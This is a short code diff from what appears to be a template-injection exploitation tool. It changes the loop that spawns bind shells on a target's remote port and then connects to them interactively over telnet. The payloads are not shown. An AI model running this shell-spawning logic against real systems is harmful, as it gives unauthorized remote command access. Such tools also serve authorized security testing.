@@ -212,12 +212,15 @@ def check_template_injection(channel):
                 log.error("Error parsing hostname")
                 return
                 
-            for idx, _ in enumerate(current_plugin.tcp_shell(tcp_shell_port)):
+            for idx, thread in enumerate(current_plugin.tcp_shell(tcp_shell_port)):
                 
                 log.info('Spawn a shell on remote port %i with payload %i' % (tcp_shell_port, idx))
                 
-                time.sleep(1)
+                thread.join(timeout=1)
 
+                if not thread.isAlive():
+                    continue
+                    
                 try:
                     
                     telnetlib.Telnet(urlparsed.hostname, tcp_shell_port, timeout = 5).interact()
@@ -226,7 +229,7 @@ def check_template_injection(channel):
                     # ended correctly and return from `run()`
                     return
                 except Exception as e:
-                    log.error(
+                    log.debug(
                         "Error connecting to %s:%i %s" % (
                             urlparsed.hostname,
                             tcp_shell_port,
